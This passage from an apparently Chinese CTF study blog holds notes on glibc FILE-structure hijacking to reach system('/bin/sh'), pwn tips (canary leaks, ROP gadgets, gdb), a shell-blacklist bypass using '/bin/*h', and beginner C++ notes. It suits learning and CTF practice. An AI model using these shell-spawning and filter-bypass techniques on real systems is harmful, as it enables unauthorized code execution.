old_buf);<br><br>      fp-&gt;_IO_write_base = new_buf;<br>      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;<br>    &#125;<br>    &#125;<br><br>  <span class="hljs-keyword">if</span> (!flush_only)<br>    *fp-&gt;_IO_write_ptr++ = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>) c;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)<br>    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;<br>  <span class="hljs-keyword">return</span> c;<br>&#125;<br>libc_hidden_def (_IO_str_overflow)<br></code></pre></td></tr></table></figure><p>执行的关键在</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">(<span class="hljs-type">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);<br></code></pre></td></tr></table></figure><p>需要通过的一些条件</p><ol><li>fp-&gt;_flags &amp; _IO_NO_WRITES为假</li><li>(pos &#x3D; fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) &gt;&#x3D; ((fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + flush_only(1))</li><li>fp-&gt;_flags &amp; _IO_USER_BUF(0x01)为假</li><li>2*(fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100</li><li>new_size &#x3D; 2 * (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100; 应当指向&#x2F;bin&#x2F;sh字符串对应的地址<ol><li>new_size来源    size_t old_blen &#x3D; _IO_blen (fp);<br>  _IO_size_t new_size &#x3D; 2 * old_blen + 100</li><li>而#define _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</li></ol></li><li>fp+0xe0 指向 system 地址</li></ol><p>构造</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">fp-&gt;_flags = <span class="hljs-number">0</span><br>fp-&gt;_IO_buf_base = <span class="hljs-number">0</span><br>fp-&gt;_IO_buf_end = (bin_sh_addr - <span class="hljs-number">100</span>) <span class="hljs-comment">//如果/bin/sh地址以奇数结尾可以+1以避免向下取整</span><br>fp-&gt;_IO_write_ptr = <span class="hljs-number">0xffffffff</span><br>fp-&gt;_IO_write_base = <span class="hljs-number">0</span><br>fp-&gt;_mode = <span class="hljs-number">0</span><br><br></code></pre></td></tr></table></figure><p>system 也可以用 one_gadgets 来替代，貌似更简单一点</p><p>然后想办法触发即可。可以修改 vtable 让原本 _IO_overflow 处的地址变成 _IO_str_overflow ，也就是修改 vtbale 为 _IO_str_jumps ，接着按以前的触发 _IO_overflow</p><h3 id="IO-str-jumps-finish"><a href="#IO-str-jumps-finish" class="headerlink" title="_IO_str_jumps -&gt; finish"></a>_IO_str_jumps -&gt; finish</h3><p>道理同上</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br>_IO_str_finish (_IO_FILE *fp, <span class="hljs-type">int</span> dummy)<br>&#123;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))<br>    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base));  <span class="hljs-comment">//[fp+0xe8]</span><br>  fp-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;<br><br>  _IO_default_finish (fp, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>检查：</p><ol><li>_IO_buf_base 不为空</li><li>_flags &amp; _IO_USER_BUF(0x01) 为假</li></ol><p>构造</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">_flags = (binsh_in_libc + <span class="hljs-number">0x10</span>) &amp; ~<span class="hljs-number">1</span><br>_IO_buf_base = binsh_addr<br><br>_freeres_list = <span class="hljs-number">0x2</span><br>_freeres_buf = <span class="hljs-number">0x3</span><br>_mode = <span class="hljs-number">-1</span><br><br>fp+<span class="hljs-number">0xe8</span> -&gt; system_addr<br></code></pre></td></tr></table></figure><p>触发同上修改 vtbale 为 _IO_str_jumps-8</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>一些小总结</title>
    <link href="/2025/05/12/%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%80%BB%E7%BB%93/"/>
    <url>/2025/05/12/%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="更换对应的libc和ld"><a href="#更换对应的libc和ld" class="headerlink" title="更换对应的libc和ld"></a>更换对应的libc和ld</h1><p>确定给的libc.so.6版本</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">strings libc.<span class="hljs-keyword">so</span>.<span class="hljs-number">6</span> | <span class="hljs-keyword">grep</span> libc<br></code></pre></td></tr></table></figure><p><img src="/2025/05/12/%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%80%BB%E7%BB%93/1747064315922.png" alt=" "></p><p>在glibc-all-in-one中下载对应的版本</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">cd</span> ~<br><span class="hljs-keyword">cd</span> glibc-all-<span class="hljs-keyword">in</span>-<span class="hljs-keyword">one</span><br></code></pre></td></tr></table></figure><p>列出版本列表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> list<br></code></pre></td></tr></table></figure><p>下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./download 对应版本<br></code></pre></td></tr></table></figure><p>patchelf到程序中</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">patchelf</span> --set-interpreter ~/glibc-<span class="hljs-literal">all</span>-in-one/libs/<span class="hljs-number">2</span>.<span class="hljs-number">23</span>-<span class="hljs-number">0</span>ubuntu11.<span class="hljs-number">3</span>_amd64/ld-<span class="hljs-number">2</span>.<span class="hljs-number">23</span>.so example<br><span class="hljs-attribute">patchelf</span> --replace-needed libc.so.<span class="hljs-number">6</span> ./libc-<span class="hljs-number">2</span>.<span class="hljs-number">23</span>.so example<br></code></pre></td></tr></table></figure><p>查看程序现在的依赖与libc库</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-keyword">ldd</span> example<br></code></pre></td></tr></table></figure><h1 id="canary泄露"><a href="#canary泄露" class="headerlink" title="canary泄露"></a>canary泄露</h1><p>要注意的是即使开了<code>canary</code>保护，程序也有可能没调用检查canary的函数，此时溢出时就不需要泄露<code>canary</code>了</p><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><p>寻找栈上偏移即可，需要注意的是64位程序是从寄存器开始算，而32位直接从栈上</p><h2 id="s覆盖低字节"><a href="#s覆盖低字节" class="headerlink" title="%s覆盖低字节"></a>%s覆盖低字节</h2><p>利用read等输入的函数来覆盖canary低字节，接着%s就能输出了</p><p>假设<code>read(0,buf,0x100)</code>，而<code>buf</code>在<code>rbp-0x20</code>处，那么我只要<code>sendline(b&#39;A&#39;*(0x20-8))</code>即可覆盖到canary最低一位的字节（sendline中最后一个回车刚好覆盖到）</p><p>在接收的时候注意要<code>canary=u64(r.recv(8))-0xa</code>，因为<strong>回车会改变canary最低字节为0xa</strong>，不是真正的canary</p><h1 id="ropper"><a href="#ropper" class="headerlink" title="ropper"></a>ropper</h1><p>进入</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ropper</span><br></code></pre></td></tr></table></figure><p>选择要分析的文件</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-built_in">file</span> example<br></code></pre></td></tr></table></figure><p>搜索gadget（以pop rdi为例子）</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-built_in">search</span> <span class="hljs-keyword">pop</span> rdi<br></code></pre></td></tr></table></figure><p>搜索string</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-built_in">string</span> /bin/<span class="hljs-keyword">sh</span><br></code></pre></td></tr></table></figure><h1 id="共享文件夹"><a href="#共享文件夹" class="headerlink" title="共享文件夹"></a>共享文件夹</h1><p>切换到共享文件夹下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~<br><span class="hljs-built_in">cd</span> /mnt/hgfs/VMware-share<br></code></pre></td></tr></table></figure><p>将文件夹文件移动到桌面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mv</span> example ~/桌面<br></code></pre></td></tr></table></figure><h1 id="gadgets"><a href="#gadgets" class="headerlink" title="gadgets"></a>gadgets</h1><h2 id="控制寄存器的值"><a href="#控制寄存器的值" class="headerlink" title="控制寄存器的值"></a>控制寄存器的值</h2><ul><li>直接控制<ul><li>能直接找到类似<code>pop rdi; ret;</code>的<code>gdagets</code>最好，这样就能直接控制</li></ul></li><li>间接控制<ul><li>有时候找不到上面的<code>gadgets</code>，但是能找到<code>mov rdi dcx; ret</code>，<code>rcx</code>可控时，也可以控制<code>rdi</code>的值</li></ul></li></ul><h2 id="利用寄存器写入-bin-sh"><a href="#利用寄存器写入-bin-sh" class="headerlink" title="利用寄存器写入&#x2F;bin&#x2F;sh"></a>利用寄存器写入&#x2F;bin&#x2F;sh</h2><p>存在<code>mov [rax],rcx; ret;</code>类似的<code>gadgets</code>，在<code>rax</code>与<code>rcx</code>都可控的情况下，控制<code>rcx</code>为<code>/bin/sh\x00</code>，·为可写入且已知的地址，这样就可以将binsh写入rax的地址之中了</p><h1 id="gdb指令大全"><a href="#gdb指令大全" class="headerlink" title="gdb指令大全"></a>gdb指令大全</h1><table><thead><tr><th align="left">命令</th><th>作用</th><th align="left">备注</th></tr></thead><tbody><tr><td align="left">r</td><td>运行</td><td align="left"></td></tr><tr><td align="left">b 函数名&#x2F;*地址</td><td>下断点</td><td align="left"></td></tr><tr><td align="left">n</td><td>单步进行</td><td align="left">汇编代码单步，不进入函数内部</td></tr><tr><td align="left">s</td><td>单步</td><td align="left">会进入函数内部</td></tr><tr><td align="left">finish</td><td>跳出函数</td><td align="left"></td></tr><tr><td align="left">c</td><td>继续运行</td><td align="left">到下个断点处</td></tr><tr><td align="left">tele 地址(0x1234)</td><td>查看地址上的信息</td><td align="left"></td></tr><tr><td align="left">stack</td><td>查看栈信息</td><td align="left">可用stack 数字 来确定查看多少条信息</td></tr><tr><td align="left">vmmap</td><td>查看各种段地址信息及权限</td><td align="left"></td></tr><tr><td align="left">p 函数名</td><td>查看该函数地址</td><td align="left"></td></tr><tr><td align="left">x&#x2F;格式 地址</td><td>查看地址上信息</td><td align="left">常用x&#x2F;20gx 20表示显示20条信息，g是表示8字节，x表示16进制b</td></tr><tr><td align="left">b *$rebase(偏移)</td><td>在开了PIE的程序下断点</td><td align="left">注意要运行了才可下断点</td></tr></tbody></table><p>tele：</p><p><img src="/2025/05/12/%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%80%BB%E7%BB%93/1747661283748.png" alt="tele"></p><h1 id="sendline与send"><a href="#sendline与send" class="headerlink" title="sendline与send"></a>sendline与send</h1><p>当程序限制read在0x20字节时，而我们要输入的长度恰好在0x20，<strong>一定要用send而不是sendline</strong>，否则多余的<code>\n</code>可能会残留在缓冲区被下一个read读取&#x2F;(ㄒoㄒ)&#x2F;~~</p><h1 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h1><p>比如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/bin/python3</span><br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;input your command&quot;</span>)<br><br>blacklist = [<span class="hljs-string">&#x27;cat&#x27;</span>,<span class="hljs-string">&#x27;ls&#x27;</span>,<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;cd&#x27;</span>,<span class="hljs-string">&#x27;echo&#x27;</span>,<span class="hljs-string">&#x27;&lt;&#x27;</span>,<span class="hljs-string">&#x27;$&#123;IFS&#125;&#x27;</span>,<span class="hljs-string">&#x27;sh&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>]<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    command = <span class="hljs-built_in">input</span>()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> command:<br>            exit(<span class="hljs-number">0</span>)<br>    os.system(command)<br></code></pre></td></tr></table></figure><p>不允许直接使用 <code>cat flag</code>，<code>/bin/sh</code>等</p><p>可以使用<code>/bin/*h</code>同样可以进入<code>system(&quot;/bin/sh&quot;)</code></p><p>原理：</p><p><strong>1. 通配符 <code>\*</code> 的作用</strong></p><ul><li><code>*</code> 在 Shell 中表示 <strong>匹配任意长度的任意字符</strong>（包括空字符）。</li><li>例如：<ul><li><code>*h</code> 会匹配所有 <strong>以 <code>h</code> 结尾</strong> 的文件或目录名。</li><li><code>/bin/*h</code> 则会匹配 <code>/bin</code> 目录下所有以 <code>h</code> 结尾的文件。</li></ul></li></ul><p> <strong>2. <code>/bin</code> 目录的典型内容</strong></p><p>在大多数 Linux 系统中，<code>/bin</code> 目录下通常包含以下文件：</p><ul><li><code>/bin/sh</code>：Bourne Shell（或符号链接到其他 Shell，如 <code>bash</code> 或 <code>dash</code>）。</li><li>其他文件如 <code>/bin/bash</code>、<code>/bin/dash</code>、<code>/bin/cat</code> 等，但 <strong>不会以 <code>h</code> 结尾</strong>。</li></ul><p>因此，执行 <code>/bin/*h</code> 时，通配符会扩展为 <code>/bin/sh</code>。</p><h1 id="python中简写sendline等"><a href="#python中简写sendline等" class="headerlink" title="python中简写sendline等"></a>python中简写sendline等</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">sla = <span class="hljs-keyword">lambda</span> a,b : r.sendlineafter(a,b)<br>sa  = <span class="hljs-keyword">lambda</span> a,b : r.sendafter(a,b)<br>ru  = lanbda a  :  r.recvuntil(a)<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>c++语法学习</title>
    <link href="/2025/03/19/c++%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/03/19/c++%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="内存分区模型"><a href="#内存分区模型" class="headerlink" title="内存分区模型"></a>内存分区模型</h1><ul><li>代码区：存放二进制代码，由操作系统管理</li><li>全局区：存放全局变量、静态变量、全局常量</li><li>栈区：<strong>编译器</strong>自动分配释放，存放函数参数值、局部变量等</li><li>堆区：由<strong>程序员</strong>分配、释放，若不释放，结束时由操作系统回收</li></ul><p>意义：赋予不同的生命周期，灵活编程</p><h2 id="程序运行前"><a href="#程序运行前" class="headerlink" title="程序运行前"></a>程序运行前</h2><p>未执行.exe文件前，分为两个区域</p><ul><li><p>代码区：</p><ul><li>存放cpu执行的机器指令</li><li>特点：共享（频繁被执行的程序只要在内存中有一份代码即可），只读（防止程序意外修改了指令）</li></ul></li><li><p>全局区：</p><ul><li><p>全局变量和静态变量在此</p></li><li><p>包含常量区，字符串常量和其他常量也存放在此</p></li><li><p>该区域数据在程序结束后由<strong>操作系统</strong>释放</p></li><li><p>静态变量：在前面加<code>static</code>，比如<code>static int a=10</code></p><p>常量：分为全局的和局部的，但只有全局的常量在常量区，<code>const int a=10</code></p></li></ul></li></ul><h2 id="程序运行后"><a href="#程序运行后" class="headerlink" title="程序运行后"></a>程序运行后</h2><ul><li>栈区<ul><li>存放函数的局部变量及参数，编译器自动开辟与free</li></ul></li><li>堆区<ul><li>由程序员手动分配与释放，如果程序员不释放的话就由操作系统释放</li><li>在c++中用<code>new</code>来分配内存</li></ul></li></ul><h2 id="new操作符语法"><a href="#new操作符语法" class="headerlink" title="new操作符语法"></a>new操作符语法</h2><p>分配：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span>* <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span>* p=<span class="hljs-keyword">new</span> <span class="hljs-built_in">int</span>(<span class="hljs-number">10</span>);<span class="hljs-comment">//在堆中开辟了一块int大小的数据，其中的数据是10，并且new会返回分配的地址</span><br><span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></td></tr></table></figure><p>释放：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> *p=<span class="hljs-built_in">func</span>();<br>cout&lt;&lt;*p&lt;&lt;endl;<br><span class="hljs-keyword">delete</span> p;<br>cout&lt;&lt;*p&lt;&lt;endl;<span class="hljs-comment">//这句会报错，因为用delete释放了</span><br>&#125;<br></code></pre></td></tr></table></figure><p>开辟一段连续的数组空间：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span>* <span class="hljs-title">func2</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span>* p=<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[<span class="hljs-number">10</span>];<span class="hljs-comment">//开辟了int类型的10个空间</span><br>     <span class="hljs-comment">//赋值</span><br>     <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)<br>          p[i]=i;<br>     <span class="hljs-comment">//打印</span><br>     <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)<br>          cout&lt;&lt;p[i]&lt;&lt;endl;<br>reuturn p;<br>&#125;<br></code></pre></td></tr></table></figure><p>释放数组：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> *p=<span class="hljs-built_in">func2</span>();<br><span class="hljs-keyword">delete</span>[] p;<span class="hljs-comment">//记得加中括号</span><br>reuturn <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><h2 id="基本语法使用"><a href="#基本语法使用" class="headerlink" title="基本语法使用"></a>基本语法使用</h2><ul><li><p>作用</p><ul><li>给变量起别名</li></ul></li><li><p>语法</p><ul><li><p>数据类型 &amp;别名&#x3D;原名</p></li><li><p>比如原来有<code>int a=10</code></p><p>创建引用<code>int &amp;b=a;</code></p></li></ul></li></ul><p>操作的是同一块内存</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li><p>必须初始化</p><p><code>int &amp;b</code>错误的</p></li><li><p>初始化后不可改变引用的对象</p></li></ul><h2 id="引用作为函数参数"><a href="#引用作为函数参数" class="headerlink" title="引用作为函数参数"></a>引用作为函数参数</h2><ul><li>作用：<ul><li>可以用引用让形式参数修饰实参</li><li>可以不用指针，简化思考</li></ul></li></ul><p>这里举一个交换两个数的例子</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-type">int</span> &amp;a,<span class="hljs-type">int</span> &amp;b)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> temp=a;<br>a=b;<br>b=temp;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>     <span class="hljs-type">int</span> a=<span class="hljs-number">10</span>,b=<span class="hljs-number">20</span>;<br>     cout&lt;&lt;<span class="hljs-string">&quot;交换前：a=&quot;</span>&lt;&lt;a;<br>     cout&lt;&lt;<span class="hljs-string">&quot; b=&quot;</span>&lt;&lt;b&lt;&lt;endl;<br>     <span class="hljs-built_in">swap</span>(a,b);<br>     cout&lt;&lt;<span class="hljs-string">&quot;交换后：a=&quot;</span>&lt;&lt;a;<br>     cout&lt;&lt;<span class="hljs-string">&quot; b=&quot;</span>&lt;&lt;b&lt;&lt;endl;<br>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="引用做函数返回值"><a href="#引用做函数返回值" class="headerlink" title="引用做函数返回值"></a>引用做函数返回值</h2><ul><li>注意：<ul><li>不能返回局部变量的引用</li></ul></li></ul><p>函数调用可以作为等号左边的值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> &amp;<span class="hljs-title">test1</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> a=<span class="hljs-number">10</span>;<br><span class="hljs-keyword">return</span> a;<span class="hljs-comment">//这里返回的是a的引用</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> &amp;b=<span class="hljs-built_in">test1</span>();<br>cout&lt;&lt;<span class="hljs-string">&quot;b=&quot;</span>&lt;&lt;b&lt;&lt;endl;<br><span class="hljs-built_in">test1</span>()=<span class="hljs-number">1000</span>;<span class="hljs-comment">//这里是对a的引用进行了修改，相当于a=1000</span><br>cout&lt;&lt;<span class="hljs-string">&quot;b=&quot;</span>&lt;&lt;b&lt;&lt;endl;<span class="hljs-comment">//再用b（别名）进行访问</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="本质"><a href="#本质" class="headerlink" title="本质"></a>本质</h2><ul><li>本质：<ul><li>在C++内部就是一个<strong>指针常量</strong>，指向我引用的对象</li></ul></li></ul><h2 id="常量引用"><a href="#常量引用" class="headerlink" title="常量引用"></a>常量引用</h2><ul><li>作用：<ul><li>用于修饰形参，防止误操作，保护参数</li></ul></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test1</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">int</span> &amp;a)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//a=100，这里就会发生错误</span><br><span class="hljs-comment">//这里就可以防止这个变量的值发生改变，保护数据</span><br>cout&lt;&lt;a&lt;&lt;endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> &amp;a=<span class="hljs-number">10</span>;<span class="hljs-comment">//自己创建了一个值为10的空间，不可修改</span><br><span class="hljs-type">int</span> aa=<span class="hljs-number">10</span>;<br><span class="hljs-built_in">test1</span>(a);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="函数提高"><a href="#函数提高" class="headerlink" title="函数提高"></a>函数提高</h1><h2 id="函数默认参数"><a href="#函数默认参数" class="headerlink" title="函数默认参数"></a>函数默认参数</h2><p>C++中，函数的形参列表中可以有默认值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test</span> <span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b=<span class="hljs-number">10</span>,<span class="hljs-type">int</span> c=<span class="hljs-number">20</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>如果我没有传参就用默认，如果我们有传参，就用我们传的参数</p><p>注意：</p><ul><li>如果某个位置有了默认参数，那么往后都必须要有默认值</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test</span> <span class="hljs-params">(<span class="hljs-type">int</span> a=<span class="hljs-number">10</span>,<span class="hljs-type">int</span> b,<span class="hljs-type">int</span> c)</span></span><br><span class="hljs-function"></span>&#123;<br>...<br>&#125;<span class="hljs-comment">//错误的</span><br></code></pre></td></tr></table></figure><ul><li>函数的声明和实现只能一边有默认参数</li></ul><h2 id="函数占位参数"><a href="#函数占位参数" class="headerlink" title="函数占位参数"></a>函数占位参数</h2><p>C++中可以有占位参数，用来占位，但在函数调用时必须填补该位置</p><p>比如</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span>)</span><span class="hljs-comment">//第二个int就是来占位的</span></span><br><span class="hljs-function"></span>&#123;<br>...<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">test</span>(<span class="hljs-number">10</span>,<span class="hljs-number">10</span>);<span 